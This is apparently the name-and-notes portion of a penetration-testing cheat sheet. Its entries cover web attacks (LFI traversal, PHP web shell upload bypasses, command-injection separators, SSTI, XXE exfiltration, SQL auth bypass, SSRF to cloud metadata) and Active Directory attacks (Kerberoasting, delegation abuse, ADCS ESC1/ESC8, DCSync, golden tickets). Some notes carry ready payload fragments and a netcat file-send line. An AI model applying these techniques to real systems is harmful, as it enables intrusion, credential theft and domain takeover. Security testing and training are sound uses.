notes: No creds. --signing lists relay candidates; --null-session/--guest-logon test anon access.

notes: Missing-patch privesc (compare with wesng).

notes: Unquoted path with spaces + writable dir = SYSTEM.

notes: Automated Windows privesc checks.

name: autologon creds (registry)
notes: DefaultUserName/DefaultPassword if set.

name: GetADUsers (list users)
notes: Dump all domain users + last logon.

name: getTGT (request ticket)
notes: Then: export KRB5CCNAME=user.ccache and use -k on other tools.

notes: Enumerate AD CS templates; toggle -vulnerable for ESC1-8.

name: ldapdomaindump
notes: HTML/JSON dump of users, groups, computers.

name: nc receive file
notes: On target: nc {LHOST} {LPORT} < file

name: nc send file
notes: Pair with the nc-receive listener on your host.

name: base64 copy-paste
notes: Copy output; on target: echo <b64> | base64 -d > {FILE}

name: sshuttle (VPN-like)
notes: RHOST = target subnet, e.g. 10.10.5.0/24. Routes it through SSH.

name: crack SSH key (ssh2john)
notes: Crack a passphrase-protected private key.

name: crack zip (fcrackzip)
notes: Dictionary attack on a password-protected zip.

name: LFI — /etc/passwd (deep traversal)
notes: Paste into the file/page param (e.g. ?page=). Add depth as needed; try a trailing NUL (%00) or ?page=....//....// bypass. URL-encode if the app decodes.

name: LFI — Windows win.ini
notes: Windows LFI confirm. Also try C:\windows\system32\drivers\etc\hosts.

name: LFI — php://filter read source
notes: Reads a PHP file's source as base64 (decode after). {FILE} e.g. index.php or config.php. Read-only recon.

name: LFI — /proc/self/environ
notes: Sometimes readable; combined with log/User-Agent poisoning for RCE in old PHP. Also try /var/log/apache2/access.log.

name: Upload probe — phpinfo()
notes: Safe exec-confirm probe. Upload then browse to it; if phpinfo renders, PHP executes in that dir.

name: Upload — minimal PHP cmd shell
notes: Authorized testing only. If .php is blocked try .phtml .php5 .php7 .phar .pht. Access as ?cmd=id. Prefer a full reverse shell once confirmed.

name: Upload — GIF magic-byte prefix
notes: Bypass content-type/magic checks: leading GIF89a; then the payload. Combine with an image extension the server maps to PHP.

name: Cmd injection — separators
notes: Append to a param that reaches a shell. Try each: ; id | id & id && id || id `id` $(id). Newline %0a id for filtered cases.

name: Cmd injection — blind time test
notes: Blind confirm: response delayed ~5s => injection. Windows: & ping -n 5 127.0.0.1.

name: Cmd injection — OOB callback
notes: Out-of-band confirm for blind cases. Start a listener/HTTP server on {LHOST}:{LPORT} first; watch for the hit.

name: SSTI — detection polyglot
notes: Breaks many template engines -> error reveals engine. Then confirm with the math probe.

name: SSTI — math confirm {{7*7}}
notes: Renders 49 => Jinja2/Twig-style. Also try ${7*7} (Java/EL), #{7*7} (Ruby), <%= 7*7 %> (ERB).

name: XXE — file read
notes: Send as XML body where the app parses XML and reflects a value. {FILE} e.g. /etc/passwd or c:/windows/win.ini. Place &x; in a reflected field.

name: XXE — OOB (blind)
notes: Blind XXE: host x.dtd on {LHOST}:{LPORT} to exfil. Confirms parsing when no reflection.

name: Auth bypass — OR 1=1
notes: Login/username field. Variants: ' OR '1'='1 | " OR 1=1-- - | admin')-- -. Comment style varies (-- - , #).

name: Auth bypass — admin comment
notes: Logs in as a known user (admin) by commenting out the password check.

name: SQLi — column count (ORDER BY)
notes: Increment 1,2,3… until error => column count for UNION. Then ' UNION SELECT NULL,NULL-- -.

name: XSS — reflected probe
notes: Detection only. If sanitized try the img handler variant.

name: XSS — attribute break-out
notes: Breaks out of an attribute context. For stored XSS confirm it fires for another session.

name: SSRF — internal / metadata
notes: Point a URL param inward. {RPORT} e.g. 80/8080/6379. Cloud metadata: http://169.254.169.254/latest/meta-data/.

name: Use a ticket (KRB5CCNAME)
notes: Pass-the-ticket: point tools at a .ccache, then run with -k -no-pass. `klist` to inspect; `describeTicket.py` for details.

name: Over-pass-the-hash — TGT from NT hash
notes: Turns an NT hash into a Kerberos TGT (user.ccache). Then: export KRB5CCNAME=user.ccache and use -k -no-pass.

name: Pass-the-key — TGT from AES key
notes: AES256 key -> TGT. Stealthier than RC4/NT. Key comes from secretsdump (aesKey) or -just-dc.

name: Targeted Kerberoast (GenericWrite)
notes: With write over a user: temporarily sets an SPN, roasts it, restores. Crack the TGS offline.

name: Kerberoast a specific user
notes: Request the TGS for one SPN account only. Crack with hashcat -m 13100.

name: Fix Kerberos clock skew
notes: KRB_AP_ERR_SKEW / clock skew too great -> sync to the DC. Alt: sudo rdate -n {DC_IP}, or faketime for a one-off.

name: Crack AS-REP (hashcat 18200)
notes: $krb5asrep$ hashes from AS-REP roasting.

name: Crack Kerberoast TGS (hashcat 13100)
notes: $krb5tgs$ hashes from Kerberoasting.

name: Find delegation (uncon/con/RBCD)
notes: Lists unconstrained, constrained, and resource-based delegation across the domain.

name: Constrained delegation S4U (getST)
notes: Impersonate a user (e.g. Administrator) to an allowed SPN. Sets a .ccache; use with -k -no-pass.

name: Add machine account (MAQ)
notes: MachineAccountQuota default 10 lets any user add a computer. Needed for the RBCD chain.

name: RBCD — set AllowedToActOnBehalf
notes: Needs write over the target computer object. Then S4U from ATTACK$ to impersonate.

name: RBCD — S4U to target as admin
notes: Final RBCD step: get a service ticket as Administrator to {TARGET}.

name: Certipy — find vulnerable templates
notes: Flags ESC1-ESC8. Look for ENROLLEE_SUPPLIES_SUBJECT + client-auth EKU (ESC1).

name: Certipy ESC1 — request cert as admin
notes: ESC1: supply an arbitrary UPN. Yields administrator.pfx.

name: Certipy — PKINIT auth (pfx -> TGT/NT)
notes: Authenticates with the cert: returns a TGT and the account's NT hash (UnPAC-the-hash).

name: Shadow Credentials (KeyCredentialLink)
notes: Needs GenericWrite/AddKeyCredentialLink over the target. Adds a key, PKINITs, returns NT hash.

name: GenericAll — reset user password
notes: ForceChangePassword/GenericAll over a user -> set a new password.

name: GenericWrite — add self to group
notes: Write over a group (e.g. an admin group) -> add yourself, then re-auth.

name: Grant DACL rights (dacledit)
notes: WriteDACL -> give yourself FullControl over the target, then abuse (reset pw / shadow creds).

name: Take ownership (owneredit)
notes: WriteOwner -> become owner, then dacledit to grant rights.

name: Coerce auth — PetitPotam
notes: Forces the DC to authenticate to {LHOST}. Relay it (ntlmrelayx) to ADCS/LDAP. Also: printerbug.py / coercer.

name: ntlmrelayx -> ADCS (ESC8)
notes: Start this first, then coerce the DC. Captures a DC cert -> certipy auth -> DCSync.

name: nxc RID cycling
notes: Enumerate domain users/groups by SID even with minimal rights (or a null/guest session).

name: nxc BloodHound collection
notes: One-shot BloodHound gather over LDAP. Import the zip into BloodHound to find paths to DA.

name: LDAP — AS-REP-roastable users
notes: DONT_REQ_PREAUTH accounts -> AS-REP roast. BASEDN e.g. DC=corp,DC=local.

name: LDAP — SPN (kerberoastable) users
notes: User accounts with an SPN -> kerberoastable.

name: nxc — passwords in descriptions
notes: Admins sometimes stash passwords in the description field. Quick win.

name: Get domain SID (lookupsid)
notes: Domain SID is needed for golden/silver tickets. Also enumerates users via RID.

name: DCSync krbtgt only
notes: Pull just the krbtgt hash (for a golden ticket). Requires DCSync rights.

name: Golden ticket (ticketer)
notes: Authorized engagements only. Needs krbtgt NT hash + domain SID. Creates Administrator.ccache.

name: Silver ticket (service hash)
notes: Forges a TGS for one service using that service account's hash. Scoped, stealthier than golden.
